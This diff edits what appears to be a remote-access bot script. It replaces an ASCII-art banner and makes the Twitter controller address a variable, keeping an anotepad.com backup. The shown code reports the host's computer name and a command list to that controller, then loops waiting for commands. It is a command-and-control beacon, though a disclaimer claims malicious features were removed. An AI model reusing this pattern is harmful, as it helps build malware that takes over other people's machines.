@@ -5,15 +5,19 @@
 # Disclaimer: This was written for experimental/educational reasons and is not intended for malicious use!
 # Please use only on machines you have full permission to control & monitor! Malicious commands & functionality removed.
 
-#                          __..--.._
-#    .....              .--~  .....  `.
-#  .":    "`-..  .    .' ..-'"    :". `
-#  ` `._ ` _.'`"(     `-"'`._ ' _.' '
-#       ~~~      `.          ~~~
-#                .'
-#               /
-#              (
-#               ^---'
+#                              IIII       
+#                   ZZ~      ?IIIIII?     
+#             : I7=?+Z$$$7ZI7IIIII  ,I:   
+#             ,7+?IIII$$$$IIIIIIII, III7, 
+#                +?IIIIIIIIIIIIIIIIIII,   
+#                   I7IIIIIIIIIIIIIIII    
+#                   IIIIIIIIIII?+:,=I     
+#                =?IIIIIIIIIII:::::::     
+#  ,=        ,=IIIIIIIIIIIII:::::,:,      
+#     ~?I??IIIIIIIIIIIIIIII:::,:::        
+#        +?IIIIIIIIIIIIIII:::::::         
+#           ~IIIIIIIIIIIII:::::           
+#                 ~?IIIIII=               
 
 # Version 1.0
 
@@ -868,9 +872,9 @@ cmdList = """
 	morphine - JPEG Injection Memory Exhaustion (Feature Removed)
 	
 [Controller]:
-	1) https://twitter.com/pyprototype
+	1) %s
 	2) https://anotepad.com/ [Backup]
-"""
+""" % (cntrlPanel)
 relayMe("Connection Established Successfully!\n\nMachine: %s\n\nCommands:\n%s" % (os.environ['COMPUTERNAME'],cmdList))
 while(True):
 	main()
